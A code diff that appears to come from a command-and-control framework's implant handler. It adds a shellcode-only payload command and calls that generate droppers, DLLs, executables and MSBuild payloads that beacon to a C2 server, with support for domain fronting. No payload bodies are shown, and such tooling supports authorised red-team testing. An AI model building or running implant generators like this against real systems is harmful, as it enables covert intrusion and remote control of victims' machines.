@@ -211,6 +211,9 @@ def implant_handler_command_loop(user, printhelp="", autohide=None):
             if command.startswith("createnewpayload"):
                 do_createnewpayload(user, command)
                 continue
+            if command.startswith("createnewshellcode"):
+                do_createnewpayload(user, command, shellcodeOnly=True)
+                continue
             if command == "help":
                 do_help(user, command)
                 continue
@@ -704,6 +707,7 @@ def do_createdaisypayload(user, command):
                           C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
     newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
     newPayload.CreateRaw(name)
+    newPayload.CreateDroppers(name)
     newPayload.CreateDlls(name)
     newPayload.CreateShellcode(name)
     newPayload.CreateEXE(name)
@@ -715,7 +719,7 @@ def do_createdaisypayload(user, command):
     clear()
 
 
-def do_createnewpayload(user, command, creds=None):
+def do_createnewpayload(user, command, creds=None, shellcodeOnly = False):
     params = re.compile("createnewpayload ", re.IGNORECASE)
     params = params.sub("", command)
     creds = None
@@ -754,13 +758,18 @@ def do_createnewpayload(user, command, creds=None):
     C2 = get_c2server_all()
     newPayload = Payloads(C2[5], C2[2], comms_url, domainfront, C2[8], proxyuser,
                           proxypass, proxyurl, "", "", C2[17], C2[18], C2[19], imurl, PayloadsDirectory)
-    newPayload.CreateRaw("%s_" % name)
-    newPayload.CreateDlls("%s_" % name)
+
+    newPayload.CreateDroppers("%s_" % name)
     newPayload.CreateShellcode("%s_" % name)
-    newPayload.CreateEXE("%s_" % name)
-    newPayload.CreateMsbuild("%s_" % name)
-    newPayload.CreatePython("%s_" % name)
-    newPayload.CreateCS("%s_" % name)
+
+    if not shellcodeOnly:
+        newPayload.CreateRaw("%s_" % name)
+        newPayload.CreateDlls("%s_" % name)
+        newPayload.CreateEXE("%s_" % name)
+        newPayload.CreateMsbuild("%s_" % name)
+        newPayload.CreatePython("%s_" % name)
+        newPayload.CreateCS("%s_" % name)
+
     new_urldetails(randomid, comms_url, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
     print_good("Created new payloads")
     input("Press Enter to continue...")
@@ -796,6 +805,7 @@ def do_createproxypayload(user, command, creds=None):
                           C2[13], C2[11], "", "", C2[17], C2[18],
                           C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
     newPayload.CreateRaw("Proxy")
+    newPayload.CreateDroppers("Proxy")
     newPayload.CreateDlls("Proxy")
     newPayload.CreateShellcode("Proxy")
     newPayload.CreateEXE("Proxy")
